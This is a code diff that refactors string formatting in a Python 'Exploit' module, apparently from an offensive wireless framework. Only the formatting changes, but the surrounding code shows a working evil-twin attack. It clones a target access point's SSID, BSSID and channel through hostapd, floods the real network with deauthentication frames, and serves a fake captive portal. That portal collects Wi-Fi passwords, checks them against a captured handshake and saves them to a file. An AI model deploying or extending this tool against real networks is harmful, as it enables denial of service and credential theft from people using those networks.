@@ -296,18 +296,18 @@ class Exploit(Exploit):
             hostapd configuration file content as a string.
         """
         lines = [
-            "interface={}".format(iface),
+            f"interface={iface}",
             "driver=nl80211",
-            "ssid={}".format(ssid),
+            f"ssid={ssid}",
             "hw_mode=g" if channel <= 13 else "hw_mode=a",
-            "channel={}".format(channel),
+            f"channel={channel}",
             "wmm_enabled=0",
             "macaddr_acl=0",
             "auth_algs=1",
             "ignore_broadcast_ssid=0",
         ]
         if bssid and bssid.lower() not in ("", "ff:ff:ff:ff:ff:ff"):
-            lines.append("bssid={}".format(bssid.lower()))
+            lines.append(f"bssid={bssid.lower()}")
         return "\n".join(lines) + "\n"
 
     def start_hostapd(self, conf_path: str) -> subprocess.Popen:
@@ -378,7 +378,7 @@ class Exploit(Exploit):
         tpl_path = os.path.join(_TEMPLATE_DIR, template_name, "index.html")
         if os.path.isfile(tpl_path):
             try:
-                with open(tpl_path, "r", encoding="utf-8") as fh:
+                with open(tpl_path, encoding="utf-8") as fh:
                     return fh.read()
             except OSError as exc:
                 logger.warning("Could not read template %s: %s", tpl_path, exc)
@@ -387,7 +387,7 @@ class Exploit(Exploit):
         tpl_path_html = os.path.join(_TEMPLATE_DIR, template_name + ".html")
         if os.path.isfile(tpl_path_html):
             try:
-                with open(tpl_path_html, "r", encoding="utf-8") as fh:
+                with open(tpl_path_html, encoding="utf-8") as fh:
                     return fh.read()
             except OSError as exc:
                 logger.warning("Could not read template %s: %s", tpl_path_html, exc)
@@ -542,7 +542,7 @@ class Exploit(Exploit):
                     status, body = check
                     if status == 302:
                         self.send_response(302)
-                        self.send_header("Location", "http://{}/".format(portal_ip))
+                        self.send_header("Location", f"http://{portal_ip}/")
                         self.send_header("Content-Length", "0")
                         self.end_headers()
                     elif status == 204:
@@ -589,7 +589,7 @@ class Exploit(Exploit):
 
                 if verify and pw and handshake and os.path.isfile(handshake):
                     if engine._verify_password_against_handshake(pw, handshake):
-                        print_success("VALID PASSWORD CONFIRMED by handshake: {}".format(pw))
+                        print_success(f"VALID PASSWORD CONFIRMED by handshake: {pw}")
 
                 self.send_response(302)
                 self.send_header("Location", "/success")
@@ -603,8 +603,8 @@ class Exploit(Exploit):
         http_thread = threading.Thread(target=server.serve_forever, daemon=True)
         http_thread.start()
 
-        print_success("Captive portal HTTP server listening on {}:80".format(portal_ip))
-        print_info("  Credentials -> {}".format(output_file))
+        print_success(f"Captive portal HTTP server listening on {portal_ip}:80")
+        print_info(f"  Credentials -> {output_file}")
         print_info("  Press Ctrl+C to stop.")
 
         try:
@@ -628,7 +628,7 @@ class Exploit(Exploit):
         """
         for cmd in (
             ["ip", "addr", "flush", "dev", iface],
-            ["ip", "addr", "add", "{}/24".format(portal_ip), "dev", iface],
+            ["ip", "addr", "add", f"{portal_ip}/24", "dev", iface],
             ["ip", "link", "set", iface, "up"],
         ):
             try:
@@ -708,7 +708,7 @@ class Exploit(Exploit):
             return
 
         duration = float(self.scan_duration)
-        print_status("Scanning for APs on {} for {:.0f}s...".format(mon_iface, duration))
+        print_status(f"Scanning for APs on {mon_iface} for {duration:.0f}s...")
 
         try:
             aps = self.scan_aps(mon_iface, duration)
@@ -738,14 +738,14 @@ class Exploit(Exploit):
                 )
             )
         print_info("")
-        print_info("Found {} AP(s). Use bssid/ssid/channel options with mode=start.".format(len(aps)))
+        print_info(f"Found {len(aps)} AP(s). Use bssid/ssid/channel options with mode=start.")
 
     def _list_templates_cmd(self) -> None:
         templates = self.list_templates()
-        print_info("Captive portal templates in {}:".format(_TEMPLATE_DIR))
+        print_info(f"Captive portal templates in {_TEMPLATE_DIR}:")
         if templates:
             for tpl in templates:
-                print_info("  - {}".format(tpl))
+                print_info(f"  - {tpl}")
         else:
             print_info("  (directory not found or no templates installed)")
 
@@ -783,18 +783,16 @@ class Exploit(Exploit):
             with open(conf_path, "w", encoding="utf-8") as fh:
                 fh.write(conf_content)
         except OSError as exc:
-            print_error("Cannot write hostapd config: {}".format(exc))
+            print_error(f"Cannot write hostapd config: {exc}")
             return
 
-        print_status("Evil twin target: SSID={!r}  BSSID={}  CH={}".format(
-            ssid_val, bssid_val, channel_val,
-        ))
+        print_status(f"Evil twin target: SSID={ssid_val!r}  BSSID={bssid_val}  CH={channel_val}")
 
         # Start native DNS/DHCP
         try:
             from wirelessxpl.modules.generic.wifi.dns_dhcp_server import CaptiveNetwork
         except ImportError as exc:
-            print_error("dns_dhcp_server import failed: {}".format(exc))
+            print_error(f"dns_dhcp_server import failed: {exc}")
             return
 
         network = CaptiveNetwork(portal_ip=portal_ip_val, interface=iface_ap)
@@ -802,9 +800,9 @@ class Exploit(Exploit):
         try:
             network.start()
             dns_dhcp_started = True
-            print_success("Native DNS/DHCP started (portal={})".format(portal_ip_val))
+            print_success(f"Native DNS/DHCP started (portal={portal_ip_val})")
         except ImportError as exc:
-            print_error("DNS/DHCP startup failed: {}".format(exc))
+            print_error(f"DNS/DHCP startup failed: {exc}")
 
         # Configure AP interface IP
         self._setup_interface(iface_ap, portal_ip_val)
@@ -815,7 +813,7 @@ class Exploit(Exploit):
         try:
             hostapd_proc = self.start_hostapd(conf_path)
             time.sleep(2)
-            print_success("hostapd started (SSID={!r})".format(ssid_val))
+            print_success(f"hostapd started (SSID={ssid_val!r})")
         except FileNotFoundError as exc:
             print_error(str(exc))
             if dns_dhcp_started:
@@ -833,7 +831,7 @@ class Exploit(Exploit):
                 name="EvilTwinDeauth",
             )
             deauth_thread.start()
-            print_success("Deauth flood started on {} -> {}".format(iface_mon, bssid_val))
+            print_success(f"Deauth flood started on {iface_mon} -> {bssid_val}")
 
         # HTTP captive portal (blocks until Ctrl+C)
         try:
@@ -865,7 +863,7 @@ class Exploit(Exploit):
             except OSError:
                 pass
 
-        print_info("Session complete. Credentials: {}".format(output_val))
+        print_info(f"Session complete. Credentials: {output_val}")
 
     # ------------------------------------------------------------------
     # Framework interface
@@ -908,5 +906,5 @@ class Exploit(Exploit):
             self._start()
         else:
             print_error(
-                "Unknown mode: {}. Valid: info, scan, list_templates, start".format(op)
+                f"Unknown mode: {op}. Valid: info, scan, list_templates, start"
             )
